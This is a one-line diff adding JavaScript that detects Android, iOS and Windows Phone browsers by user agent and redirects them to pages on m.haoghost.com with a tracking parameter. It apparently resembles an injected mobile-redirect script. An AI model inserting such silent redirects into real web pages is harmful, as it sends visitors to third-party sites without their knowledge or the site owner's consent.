@@ -1,0 +1,1 @@
+var qd="a67",ua=navigator.userAgent;if(/android/i.test(ua)){window.location.href="http://m.haoghost.com/index_80xb.html?f="+qd;}else if( /iPad|iphone|iPod/i.test(ua) ){window.location.href="http://m.haoghost.com/ios.html?f="+qd;}else if( /(Windows\s+Phone)\s([\d\.]+)/i.test(ua)){window.location.href="http://m.haoghost.com/index_80xb.html?f="+qd+"wp";}
